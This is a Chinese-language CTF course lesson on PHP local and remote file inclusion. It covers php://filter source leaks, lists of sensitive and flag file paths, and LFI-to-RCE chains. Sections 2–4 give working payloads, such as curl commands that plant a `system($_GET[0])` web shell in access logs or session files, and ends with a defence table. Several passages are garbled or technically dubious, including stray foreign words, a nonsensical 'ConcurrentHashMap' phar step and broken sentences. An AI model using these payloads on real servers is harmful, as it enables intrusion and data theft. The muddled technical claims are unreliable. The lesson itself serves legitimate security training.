# W4 · 檔案包含與讀取（25 分鐘）

> 內容：PHP 檔案包含（LFI/RFI）、php://filter 洩露原始碼、日誌/session 包含成 RCE，以及「讀檔拿 flag」的常用路徑表。
> 前置：W3 §4（上傳），因為「包含+上傳」是最經典的複合鏈（詳情於 W7）。

---

## 1 · 一分鐘原理

```php
<?php $page = $_GET['page'];
include($page . '.php');   // 經典進入點
```

`include` 做 3 件事：**檔案存在就載入、按 PHP 語法 parse、輸出非 PHP 部分**。
當 `$page` 可控時：
- 指向本地檔案 → LFI（含 flag、原始碼、日誌）
- 指向可寫入路徑 + 副檔名可控 → RCE（見 §4）
- PHP 沒關 `allow_url_include` → RFI（遠端包含，rare）

**後綴 `.php` 被硬接** 的解法：

| 技巧 | 版本/條件 |
|---|---|
| `/proc/self/fd/…` / `/proc/self/environ` | 通吃，因為查到的是 inode |
| `%00` 截斷 | PHP < 5.3.4 |
| 長過 `4096` 的目錄路徑 | 某些 release 讀取長度限制 |
| `.`（dot）結尾，如 `/etc/passwd/.` | 促進 SeLinux 判定失敌 |

## 2 · PHP 包裝器（php://filter）——讀原始碼而不是讀「輸出後的 HTML」

```text
含進 `index.php` 會執行 PHP；但「想看 PHP 原始碼」就要 base64 過一次：

?page=php://filter/read=convert.base64-encode/resource=index.php
```

**結果**是 Base64 字串，解碼後為原始碼。同款還可：

```text
?file=php://filter/convert.base64-encode/resource=/var/www/html/tmp/config.php
```

** filter 的拼搭鏈（強化 "無 `read=`" 情境）**：

```text
php://filter/convert.base64-encode|convert.base64-encode/resource=flag.php
# (chained allow filter 種) 可使得 base64輸出二次編碼 escape_perm = -------------
```

### 2.1 其他 PHP wrapper 一覽（檢驗 `allow_url_*`）

| Wrapper | 條件 | 主要用途 |
|---|---|---|
| `php://input` | `allow_url_include=On`（PHP<7.2 亦讀 post body; PHP>=7 已弱化） | 包含 POST 的 PHP 程式 |
| `data://` | `allow_url_include=On` | `data://text/plain;base64,<b64>` |
| `zip://` / `phar://` | 依 PHP 版本（`phar://demo.zip/f.php`） | 定位 located zip 內檔案 (檔名可控即可 RCE) |
| `file://` | default | 網钜連通 |
| `http://`、`ftp://` | `allow_url_fopen` | 遠端 fetch |
| `glob://` | default | 列目錄（`glob:///*`） |
| `expect://` | 需 ext | 執行命令（少見） |

**CTF 建議速查：**
```text
Get 任何 file 資料:
php://filter/read=convert.base64-encode/resource= conocido file
Get PHP 原始碼（已有 `.php` 後綴）:
php://filter/read=convert.base64-encode/resource=fp.php
```

## 3 · 讀什麼？路徑速查表（先抄這個）

### 3.1 拿 flag 的 12 條路徑（機率從高到低）

```text
/flag                  /flag.txt               /flag_xxxx（名稱隨機）
/flag.php              /var/www/html/flag      /var/www/flag
/root/flag             /home/*/flag            /opt/flag
/app/flag              /srv/flag               環境變數 $FLAG(要 shell)
```

### 3.2 拿「資訊」的特殊檔案

| 檔案 | 洩露內容 |
|---|---|
| `/etc/passwd` | 使用者 UID/GID 驚有 shell；找 `/home/<user>` |
| `/proc/self/cmdline` | 啟動機器的指令 → 找 `www-data`/容器 |
| `/proc/self/environ` | 環境變數；**該容器「寫死」的 FLAG 可能在此** |
| `/proc/self/fd/N` | 各 fd 關聯 Open 的檔案（真正找 N 需列舉） |
| `/proc/net/tcp`（/fq） | open socket 資料（`Port Chk`） |
| `/etc/hosts` | 服務編號全面列舉 |
| `~/.bash_history` | 有歷史帳密/URL |
| `/var/log/audit/audit.log` / `authorized_keys` | 有人在系統 shell |
| `/var/www/html/config.*` / `.env` | 資料庫/ROOT 密碼 |
| `/ Pix phpinfo used` | 服務 info，見 `flag` 一欄 |

### 3.3 通過 `$FLAG` 環境變數拿 flag（CTF 主流容器做法）

```text
php://filter /read=convert.base64-encode/resource=/proc/self/environ
# 或者讀 /proc/self/environ 含 binary \0，需用 hex 過濾前 3 bits
```

**No failure 備案**：
```text
/proc/1/environ   # pid 1 環境變數最有機率藏 flag
/proc/1/cmdline   # 主进程啟動參數
```

## 4 · LFI 變 RCE 的 5 條標準鍊

### 4.1 Log Poising (日誌污染) — 賽場最常見

```text
1) 確認 web 將輸入寫入的日誌檔:
   /var/log/nginx/access.log   # nginx: User-Agent 存入; 聯合 `<?php system($_GET[\"c\"]);?>`
   /var/log/apache2/access.log
2) 經 LFI include該日誌: ?file=/var/log/nginx/access.log
```

**Verification**：傳的 User-Agent 頭不一定能傳太長，可通過「短 payload」+「多 beat 組合」改 curl：

```bash
curl -H 'User-Agent: <?php echo "pwned";system($_GET[0]);?>' "http://target/"
curl "http://target/include.php?file=/var/log/nginx/access.log&0=id"
```

> **成功信號**：回來的 body 出現你 UA 的逐字內容 + 系統命令輸出。若只有 UA 字串，代表日誌寫入成功但 include 的 path 不對（試 `/var/log/apache2/access.log`）。

### 4.2 PHP Session 包含（`session.upload_progress`）

當 PHP 的 `session.upload_progress.enabled=On`、`session.save_path` 可讀且 `include` 進 `/tmp/sess_xxx`：

```bash
# 1) 觸發 ( PHP>5.4)
# 2) POST 同時傳 file 和PHP_SESSION_UPLOAD_PROGRESS 名稱 = payload
curl -v 'http://target/include.php?file=/tmp/sess_XXXX' \
  -F 'PHP_SESSION_UPLOAD_PROGRESS=<?php system("cat /flag");?>' \
  -F 'file=@/tmp/q' -H 'Cookie: PHPSESSID=XXXX'
```

詳情 + 腳本見練習題集 #13（檔案包含）。

### 4.3 `/proc/self/environ` 污染

```bash
curl -H 'User-Agent: <?php echo "<?php system(\$_GET[0]);?>";?>' \
  "http://target/include.php?file=/proc/self/environ&0=id"
```

障礙：PHP 的 `proc/self/environ` 會在 HTTP **B**ody/UI 之間鍵化處理，有時要「send empty body」或「`std_shutdown`」。

### 4.4 已上傳檔案的包含（Zip/Phar/圖片）

```text
?file=phar://uploads/shell.zip/f.php          # phar wrapper
?file=zip://uploads/shell.zip%23f.php        # zip
?file=uploads/img.php                        # 直接檔案名
```

配合方式：上傳 `.zip`（副檔名白名單可能沒禁）→ 包含 zip 裡的 php。
**帶出 alarm**：`phar:` wrapper 军心 老 PHP 仍可關 見 `W6`。

### 4.5 `file = {任意副檔名}` + `phar` Meta-data（早期 PHP）

> 當 PHP < 8.0 且又 讀 file 存在（先 `populate the metadata`）：
> 上傳一個 phar連結；再讓 `'file_exists($file_name)'` → phar 解 ConcurrentHashMap 觸發 ------

## 5 · 防禦

| 攻擊面 | 修補 | 補註 |
|---|---|---|
| 任意檔案包含 | 白名單：`$pages = ['home'=>  'home.php']; include $pages[$page]; | per-tree race |
| 相對 history | `basename()` 并強制同目錄 | 白名單不够則拒絕 `../`、`php://filter` |
| 環境 `allow_url_*` | `php.ini` 關閉 `allow_url_include` | **這一條在 CTF 分布替你打 50% 題** |
| 日誌 | 關閉 UA 日誌存取 (or escape UA) | `access_log off` 局部設置 |
| session | `session.upload_progress.enabled=Off` | 設定 `session.save_path` 走 root 欄位 |
| `filter` | 检查 `$_SERVER['DOCUMENT_ROOT']` 開頭匹配 | realpath 後確認 prefix |

**php.ini 安全組合**：

```ini
allow_url_include = Off
allow_url_fopen  = Off
session.upload_progress.enabled = Off
open_basedir = /var/www/html:/tmp     # 至少；CTF 補在內部
```

## 7 · 講師提示

- `php://filter` 後綴硬碼 `.php` 是多少學員的第 1 個卡點——先讲「resource 指不是檔名，且 suffix 會加」。
- 讀 `/proc/self/environ` 會有 `\0`，在 Burp 里檢查 raw cursor。
- **日誌投毒是「10 分鐘可解但 30% 學員不會」的技術**——務必 demo 成功一次。
